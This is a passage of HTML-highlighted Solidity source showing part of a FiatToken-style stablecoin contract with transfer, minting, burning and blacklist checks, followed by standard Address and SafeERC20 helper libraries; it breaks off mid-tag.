  <span class=\"token keyword\">function</span> <span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value\n    <span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        override\n        whenNotPaused\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            value <span class=\"token operator\">&lt;=</span> allowed<span class=\"token punctuation\">[</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"ERC20: transfer amount exceeds allowance\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        allowed<span class=\"token punctuation\">[</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> allowed<span class=\"token punctuation\">[</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Transfer tokens from the caller\n     * @param to    Payee's address\n     * @param value Transfer amount\n     * @return True if successful\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        override\n        whenNotPaused\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Internal function to process transfers\n     * @param from  Payer's address\n     * @param to    Payee's address\n     * @param value Transfer amount\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> override <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: transfer from the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>to <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: transfer to the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            value <span class=\"token operator\">&lt;=</span> balances<span class=\"token punctuation\">[</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"ERC20: transfer amount exceeds balance\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        balances<span class=\"token punctuation\">[</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        balances<span class=\"token punctuation\">[</span>to<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>to<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Function to add/update a new minter\n     * @param minter The address of the minter\n     * @param minterAllowedAmount The minting amount allowed for the minter\n     * @return True if the operation was successful.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">configureMinter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> minter<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> minterAllowedAmount<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        whenNotPaused\n        onlyMasterMinter\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        minters<span class=\"token punctuation\">[</span>minter<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n        minterAllowed<span class=\"token punctuation\">[</span>minter<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> minterAllowedAmount<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">MinterConfigured</span><span class=\"token punctuation\">(</span>minter<span class=\"token punctuation\">,</span> minterAllowedAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Function to remove a minter\n     * @param minter The address of the minter to remove\n     * @return True if the operation was successful.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">removeMinter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> minter<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        onlyMasterMinter\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        minters<span class=\"token punctuation\">[</span>minter<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        minterAllowed<span class=\"token punctuation\">[</span>minter<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">MinterRemoved</span><span class=\"token punctuation\">(</span>minter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev allows a minter to burn some of its own tokens\n     * Validates that caller is a minter and that sender is not blacklisted\n     * amount is less than or equal to the minter's account balance\n     * @param _amount uint256 the amount of tokens to be burned\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">burn</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _amount<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        whenNotPaused\n        onlyMinters\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> balance <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>_amount <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"FiatToken: burn amount not greater than 0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balance <span class=\"token operator\">>=</span> _amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"FiatToken: burn amount exceeds balance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        totalSupply_ <span class=\"token operator\">=</span> totalSupply_<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balance<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Burn</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">updateMasterMinter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _newMasterMinter<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            _newMasterMinter <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatToken: new masterMinter is the zero address\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        masterMinter <span class=\"token operator\">=</span> _newMasterMinter<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">MasterMinterChanged</span><span class=\"token punctuation\">(</span>masterMinter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token comment\">/**\n * @dev Collection of functions related to the address type\n */</span>\n<span class=\"token keyword\">library</span> <span class=\"token class-name\">Address</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">/**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     * ====\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isContract</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// According to EIP-1052, 0x0 is the value returned for not-yet created accounts</span>\n        <span class=\"token comment\">// and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned</span>\n        <span class=\"token comment\">// for accounts without code, i.e. `keccak256('')`</span>\n        <span class=\"token builtin\">bytes32</span> codehash<span class=\"token punctuation\">;</span>\n\n            <span class=\"token builtin\">bytes32</span> accountHash\n         <span class=\"token operator\">=</span> <span class=\"token number\">0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// solhint-disable-next-line no-inline-assembly</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            codehash <span class=\"token operator\">:=</span> <span class=\"token function\">extcodehash</span><span class=\"token punctuation\">(</span>account<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>codehash <span class=\"token operator\">!=</span> accountHash <span class=\"token operator\">&amp;&amp;</span> codehash <span class=\"token operator\">!=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. &#123;sendValue&#125; removes this limitation.\n     *\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * &#123;ReentrancyGuard&#125; or the\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> recipient<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Address: insufficient balance\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// solhint-disable-next-line avoid-low-level-calls, avoid-call-value</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> recipient<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            success<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Address: unable to send value, recipient may have reverted\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain`call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">functionCall</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> target<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">internal</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">functionCall</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Address: low-level call failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Same as &#123;xref-Address-functionCall-address-bytes-&#125;[`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">functionCall</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> target<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> errorMessage\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">_functionCallWithValue</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Same as &#123;xref-Address-functionCall-address-bytes-&#125;[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">functionCallWithValue</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> target<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span>\n            <span class=\"token function\">functionCallWithValue</span><span class=\"token punctuation\">(</span>\n                target<span class=\"token punctuation\">,</span>\n                data<span class=\"token punctuation\">,</span>\n                value<span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Address: low-level call with value failed\"</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Same as &#123;xref-Address-functionCallWithValue-address-bytes-uint256-&#125;[`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">functionCallWithValue</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> target<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> errorMessage\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> value<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Address: insufficient balance for call\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">_functionCallWithValue</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">,</span> errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_functionCallWithValue</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> target<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> weiValue<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> errorMessage\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">isContract</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Address: call to non-contract\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// solhint-disable-next-line avoid-low-level-calls</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> returndata<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> target<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>weiValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> returndata<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">// Look for revert reason and bubble it up if present</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>returndata<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token comment\">// The easiest way to bubble the revert reason is using memory via assembly</span>\n\n                <span class=\"token comment\">// solhint-disable-next-line no-inline-assembly</span>\n                <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token keyword\">let</span> returndata_size <span class=\"token operator\">:=</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span>returndata<span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">revert</span><span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span> returndata<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> returndata_size<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">revert</span><span class=\"token punctuation\">(</span>errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">library</span> <span class=\"token class-name\">SafeERC20</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">safeTransfer</span><span class=\"token punctuation\">(</span>\n        IERC20 token<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_callOptionalReturn</span><span class=\"token punctuation\">(</span>\n            token<span class=\"token punctuation\">,</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSelector</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span>transfer<span class=\"token punctuation\">.</span>selector<span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">safeTransferFrom</span><span class=\"token punctuation\">(</span>\n        IERC20 token<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_callOptionalReturn</span><span class=\"token punctuation\">(</span>\n            token<span class=\"token punctuation\">,</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSelector</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span>transferFrom<span class=\"token punctuation\">.</span>selector<span class=\"token punctuation\">,</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token 